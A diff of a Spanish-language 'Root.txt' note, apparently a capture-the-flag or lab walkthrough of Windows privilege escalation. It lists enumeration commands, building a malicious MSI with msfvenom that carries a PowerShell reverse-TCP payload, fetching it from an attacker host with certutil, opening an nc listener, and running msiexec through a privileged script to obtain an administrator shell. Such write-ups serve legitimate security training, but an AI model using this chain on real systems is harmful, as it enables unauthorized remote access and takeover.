@@ -1,9 +1,38 @@
 Root.txt
 
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
+
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
+
+Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
+    net localgroup group_name 
+
+En la descripcion pone que podemos ejecutar el binario wuauclt.exe con privilegios administrador de la siguiente forma:
+C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'
+
+Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
+Y nos pone lo que tenemos que hacer para realizar la escalada.
+
+
+Creamos el .msi malicioso con msfvenom:
 msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=IP LPORT=PORT -f msi > cmd.msi
 
-python3 -m http.server
+Ahora lo subimos a la maquina:
+abrir servicio web en el directorio en donde tenemos los archivos anteriores:
+    - python3 -m http.server
+descargar el archivo:
+    - certutil -f -urlcache -split http://IP:PORT/cmd.msi -> El PORT suele ser el 8000 por defecto.
 
-nc -lvp PORT
 
-msiexec.exe /q /i http://IP/cmd.msi
+
+Ahora que ya esta todo preparado, ejecutamos el binario como dice lolbas:
+En nuestra terminal de linux ejecutamos:
+    - nc -lvp PORT 
+
+Este es el comando:
+    - msiexec.exe /q /i http://IP/cmd.msi
+pero tenemos que poner lo siguiente:
+    -  C:\Users\Administrator\Desktop\script.exe -ArgumentList '/q /i http://IP/cmd.msi'
+
